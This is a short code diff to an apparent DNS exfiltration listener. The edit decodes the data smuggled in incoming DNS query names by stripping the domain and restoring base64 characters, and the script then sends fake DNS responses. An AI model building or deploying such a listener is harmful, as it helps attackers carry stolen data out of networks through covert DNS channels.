@@ -77,7 +77,12 @@ try:
 
 		# DECODE incoming DNS queries
 		domain_exfil = decode_dns_query(data)
-		print("[" + rhost + "]" + " ==> " + domain_exfil, end="")
+		dcopy = domain_exfil.replace("." + domain + ".", "")
+		dcopy = dcopy.replace(".", "+")
+		dcopy = dcopy.replace("-", "=")
+		dcopy = dcopy.replace("_", "/")
+		dcopy = dcopy + "." + domain
+		print("[" + rhost + "]" + " ==> " + dcopy, end="")
 
 		# ENCODE & SEND fake DNS response
 		encode_dns_response()
